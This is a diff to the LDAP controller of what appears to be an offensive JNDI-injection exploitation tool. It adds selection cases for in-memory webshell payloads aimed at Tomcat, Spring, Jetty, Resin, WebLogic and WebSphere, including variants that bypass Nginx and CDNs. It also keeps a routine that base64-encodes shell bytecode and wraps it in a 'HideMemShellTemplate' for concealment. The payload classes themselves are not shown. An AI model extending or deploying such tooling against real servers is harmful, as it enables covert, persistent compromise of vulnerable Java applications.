@@ -8,7 +8,12 @@ import com.qi4l.jndi.gadgets.Config.Config;
 import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Util;
 import com.qi4l.jndi.template.*;
+import com.qi4l.jndi.template.memshell.BypassNginxCDN.cmsMSBYNC;
+import com.qi4l.jndi.template.memshell.BypassNginxCDN.proxyMSBYNC;
+import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJproxy;
+import com.qi4l.jndi.template.memshell.Tomcat_Spring_Jetty.MsTSJser;
 import com.qi4l.jndi.template.memshell.Websphere.WSFMSFromThread;
+import com.qi4l.jndi.template.memshell.Websphere.WSWebsphereProxy;
 import com.qi4l.jndi.template.memshell.Websphere.WebsphereMemshellTemplate;
 import com.qi4l.jndi.template.memshell.Websphere.websphereEcho;
 import com.qi4l.jndi.template.echo.*;
@@ -21,6 +26,7 @@ import com.qi4l.jndi.template.echo.jettyEcho;
 import com.qi4l.jndi.template.memshell.resin.RFMSFromThreadF;
 import com.qi4l.jndi.template.memshell.resin.RSMSFromThreadS;
 import com.qi4l.jndi.template.echo.resinEcho;
+import com.qi4l.jndi.template.memshell.resin.WsResin;
 import com.qi4l.jndi.template.memshell.spring.SpringControllerMS;
 import com.qi4l.jndi.template.memshell.spring.SpringInterceptorMS;
 import com.qi4l.jndi.template.memshell.struts2.Struts2ActionMS;
@@ -28,6 +34,7 @@ import com.qi4l.jndi.template.echo.weblogicEcho;
 import com.qi4l.jndi.gadgets.utils.ClassNameUtils;
 import com.qi4l.jndi.gadgets.utils.HexUtils;
 import com.qi4l.jndi.template.memshell.tomcat.*;
+import com.qi4l.jndi.template.memshell.weblogic.WsWeblogic;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -114,6 +121,27 @@ public class BasicController implements LdapController {
                 case allecho:
                     className = AllEcho.class.getName();
                     break;
+                case cmsmsbync:
+                    className = cmsMSBYNC.class.getName();
+                    break;
+                case proxymsbync:
+                    className = proxyMSBYNC.class.getName();
+                    break;
+                case wsresin:
+                    className = WsResin.class.getName();
+                    break;
+                case mstsjser:
+                    className = MsTSJser.class.getName();
+                    break;
+                case mstsjproxy:
+                    className = MsTSJproxy.class.getName();
+                    break;
+                case wsweblogic:
+                    className = WsWeblogic.class.getName();
+                    break;
+                case wswebsphereproxy:
+                    className = WSWebsphereProxy.class.getName();
+                    break;
                 case tomcatfilterjmx:
                     className = structureShell(TFJMX.class);
                     break;
@@ -181,7 +209,7 @@ public class BasicController implements LdapController {
                             case 1:
                                 break;
                             case 2:
-                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                                 newClass.setName(ClassNameUtils.generateClassName());
                                 String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                 className = "className=\"" + ctClass.getName() + "\";";
@@ -225,7 +253,7 @@ public class BasicController implements LdapController {
                             case 1:
                                 break;
                             case 2:
-                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                                 newClass.setName(ClassNameUtils.generateClassName());
                                 String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                 className = "className=\"" + ctClass.getName() + "\";";
@@ -280,7 +308,7 @@ public class BasicController implements LdapController {
                             case 1:
                                 break;
                             case 2:
-                                CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                                CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                                 newClass.setName(ClassNameUtils.generateClassName());
                                 String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                                 className = "className=\"" + ctClass.getName() + "\";";
@@ -336,7 +364,7 @@ public class BasicController implements LdapController {
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
-            base = base.replace('\\','/');
+            base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
             int secondIndex = base.indexOf("/", fistIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
